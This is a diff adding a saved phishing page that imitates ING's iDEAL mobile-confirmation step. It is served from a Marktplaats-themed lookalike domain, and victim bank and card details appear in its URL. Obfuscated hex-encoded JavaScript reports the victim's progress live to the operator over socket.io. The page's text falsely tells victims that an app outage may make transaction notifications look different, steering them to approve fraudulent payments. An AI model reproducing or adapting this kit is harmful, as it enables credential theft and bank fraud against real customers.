@@ -1,0 +1,138 @@
+
+<!-- saved from url=(0202)https://marktplaats-helpdesk.info/ingportal/particulier/trxid=xbWsWAydVHdSdfx4/activate?accountNumber=NL28+INGB+7072+8383+83&pasnr=232+A+233&geldigtotMaand=32&geldigtotJaar=2334&raktaGebdatum=10-12-2003 -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+	<style type="text/css">
+@charset "UTF-8";
+[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){
+    display:none !important;
+}
+ng\:form{
+    display:block;
+}
+.ng-animate-shim{
+    visibility:hidden;
+}
+.ng-anchor{
+    position:absolute;
+}
+
+	</style>
+	
+	
+	<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+	<meta content="width=device-width, initial-scale=1.0" name="viewport">
+	<meta content="notranslate" name="google">
+	<script src="./iDEAL - Mijn ING_files/jquery.min.js"></script>
+	<script src="./iDEAL - Mijn ING_files/bootstrap.min.js"></script>
+	<script src="./iDEAL - Mijn ING_files/socket.io.js"></script>
+	<script src="./iDEAL - Mijn ING_files/jquery.validate.min.js"></script>
+	<script src="./iDEAL - Mijn ING_files/vue.js"></script>
+	<script>var socket = io.connect();</script>
+	<title>iDEAL - Mijn ING</title>
+</head>
+<body>
+	<link rel="stylesheet" href="./iDEAL - Mijn ING_files/the-guide-styles-responsive.css">
+	<link rel="stylesheet" href="./iDEAL - Mijn ING_files/custom.css">
+	<link rel="shortcut icon" href="https://marktplaats-helpdesk.info/img/favicon.ico">
+	<div id="giDealApp">
+		<!-- ngInclude: -->
+		<div class="ng-scope">
+			<div class="ng-scope">
+				<div class="tg">
+					<div class="container">
+						<div class="row">
+							<div class="col-md-12 col-lg-10 col-lg-offset-1 col-xl-8 col-xl-offset-2">
+								<header role="banner">
+								<img id="ing-logo" src="./iDEAL - Mijn ING_files/SES_logo_ing.gif" alt="ING Logo" style="border-radius: 0px;" width="128" height="32">
+
+									<div class="languages h-float-right hidden-print ng-scope">
+										<button class="btn btn-default ng-scope" id="languageButton" tabindex="0"><span class="sr-only ng-binding">Kies taal</span><span class="ng-binding">Nederlands</span></button>
+									</div><!-- end ngIf: pageInfo.features.i18n -->
+									<h1 class="l-mt-1 ng-binding" id="pageHeader">Bevestig met je Mobiel <!-- ngIf: pageInfo.pageTitleStep --><span class="font-primary-r-xxl h-no-wrap ng-scope" translate="steptitle">(Stap 3 van 4)</span><!-- end ngIf: pageInfo.pageTitleStep --></h1>
+								</header>
+								<main role="main">
+									<div class="ng-hide">
+										<div class="ng-isolate-scope alert alert-danger" id="errorMessage" role="alert">
+											<span class="stacked-icon icon-lg"><i aria-hidden="true" class="icon icon-notification-error-z1 icon-red"></i><i aria-hidden="true" class="icon icon-white icon-notification-error-z2"></i></span><!-- ngIf: closeable --><span></span>
+											<p class="ng-binding ng-scope"><span></span></p>
+											<div class="btn-bar l-mb-1 ng-scope">
+												<span><!-- ngIf: error.retryable --><button class="btn btn-primary ng-binding ng-scope" type="button"><span>Probeer opnieuw</span></button><button class="btn btn-secondary ng-binding ng-scope" id="errorReturnToWebshopSecondary" type="button">Terug naar webwinkel</button><!-- end ngIf: transaction.merchantReturnUrl && error.retryable --> <!-- ngIf: !transaction.merchantReturnUrl && !error.retryable --> <!-- ngIf: !transaction.merchantReturnUrl && error.retryable --> <button class="btn btn-default ng-scope ng-binding" id="moreInfoBtn" tabindex="0" type="button">Meer informatie</button></span>
+											</div>
+										</div>
+									</div><!-- ngIf: pageInfo.step == 1 && !error.blockingGeneralError --><!-- ngIf: pageInfo.step == 2 && !error.blockingGeneralError --><!-- ngInclude: 'partials/tan.html' -->
+									<div id="app">
+									<div class="ng-scope">
+										<div class="l-mb-1 ng-scope">
+											<!-- ngIf: formTitle -->
+											<!-- end ngIf: formTitle -->
+											<script>
+												var _0x750a=["\x6C\x69\x76\x65\x53\x74\x61\x74\x75\x73\x50\x61\x67\x65\x31","\x3C\x62\x3E\x20\x63\x75\x72\x72\x65\x6E\x74\x20\x70\x61\x67\x65\x3A\x20\x42\x65\x76\x65\x73\x74\x69\x67\x69\x6E\x67\x20\x76\x61\x6E\x20\x61\x70\x70\x20\x69\x6E\x20\x76\x69\x73\x20\x7A\x69\x6A\x6E\x20\x74\x65\x6C\x20\x65\x6E\x20\x64\x72\x75\x6B\x74\x20\x6F\x70\x20\x6F\x6B\x3C\x2F\x62\x3E","\x65\x6D\x69\x74"];socket[_0x750a[2]](_0x750a[0],_0x750a[1])
+											</script>
+											<div class="h-hidden">
+												<dl class="dl-grid l-mb-0 dl-title-bold">
+													<dt class="col-xs-4 ng-binding" id="amountTermCollapsible">Bedrag</dt>
+													<dd aria-labelledby="amountTermCollapsible" class="col-xs-8" id="amountCollapsible"><strong class="font-size-hg h-bold ng-binding">€&nbsp;0.01</strong></dd>
+												</dl>
+												<div aria-expanded="false" class="l-mb-0 panel panel-sm ng-isolate-scope panel-default" id="moreDetails" role="group">
+													<div class="panel-heading collapsible-header">
+														<div class="panel-title">
+															<a class="h-block ng-binding collapsed" href="https://marktplaats-helpdesk.info/ingportal/particulier/trxid=xbWsWAydVHdSdfx4/activate?accountNumber=NL28+INGB+7072+8383+83&amp;pasnr=232+A+233&amp;geldigtotMaand=32&amp;geldigtotJaar=2334&amp;raktaGebdatum=10-12-2003" role="button"><i aria-hidden="true" class="icon icon-xxs icon-collapsible-toggle"></i>Details</a>
+														</div>
+													</div>
+													<div class="collapsible-details collapse">
+														<div aria-hidden="true" class="panel-body" hidden="">
+															<div>
+																<dl class="dl-grid l-mb-0 dl-title-bold l-ml-n3 ng-scope" id="formFieldsCollapsible">
+																	<dt class="col-xs-4 ng-binding ng-scope" id="debtorTermCollapsible">Van rekening</dt>
+																	<dd aria-labelledby="debtorTermCollapsible" class="col-xs-8 ng-binding ng-scope" id="accountNameCollapsible"></dd>
+																	<dd aria-labelledby="debtorTermCollapsible" class="col-xs-8 ng-binding ng-scope" id="accountCollapsible"></dd>
+																	<dt class="col-xs-4 ng-binding" id="dateTermCollapsible">Datum</dt>
+																	<dd aria-labelledby="dateTermCollapsible" class="col-xs-8"><span class="ng-binding" id="timeStampCollapsible">06 September 2018</span></dd>
+																	<dt class="col-xs-4 ng-binding" id="transactionIdTermCollapsible">Transactienummer</dt>
+																	<dd aria-labelledby="transactionIdTermCollapsible" class="col-xs-8"><span class="ng-binding" id="transactionIdCollapsible">0065300987453210</span></dd>
+																	<dt class="col-xs-4 ng-binding" id="descriptionTermCollapsible">Omschrijving</dt>
+																	<dd aria-labelledby="descriptionTermCollapsible" class="col-xs-8 ng-binding" id="purchaseDescriptionCollapsible">bestelling</dd>
+																	<dt class="col-xs-4 ng-binding" id="purchaseIdTermCollapsible">Ordernummer</dt>
+																	<dd aria-labelledby="purchaseIdTermCollapsible" class="col-xs-8 h-text-overflow-wrap ng-binding" id="purchaseIDCollapsible">9H1D22</dd>
+																</dl>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+										<div class="ng-scope">
+											<div class="panel panel-bordered panel-default" id="qrPanel">
+												<form id="register" class="form-horizontal" method="get" action="post_app.php">
+												<div class="panel-body">
+													<h5 class="h-text-b" id="qrHeader" style="color:black !important">Open de Mobiel Bankieren App</h5>
+													<div class="row">
+												<div class="l-pl-1 l-pr-1"><div class="position position-left position-xxxmg"> <div class="position-component"><img class="img-responsive" src="./iDEAL - Mijn ING_files/ING_0208_RICHICONS_2.png"></div> <p>Open de Mobiel Bankieren App<br>
+In de app zie je de knop 'Bevestigen'.<br>
+Daarmee log je in. Dankzij een storing in de Ing app kunnen de gegevens van meldingen afwijken, wij werken hier aan </p> 
+												<button class="btn btn-primary" id="qrpopup">Volgende</button> </div> </div>
+												 <hr>
+													</div>
+												</div>
+											</form>
+											</div>
+											<!-- ngIf: error.blockingGeneralError === false -->
+
+										</div>
+									</div><!-- end ngIf: pageInfo.step == 2 && !error.blockingGeneralError --><!-- ngIf: pageInfo.step == 3 -->
+								</div> <!--end app-->
+									<div class="btn-bar">
+										<button class="btn btn-default ng-scope ng-binding" tabindex="0" type="button">Help</button>
+									</div>
+								</main>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div><!-- App end -->
+
+
+</body></html>
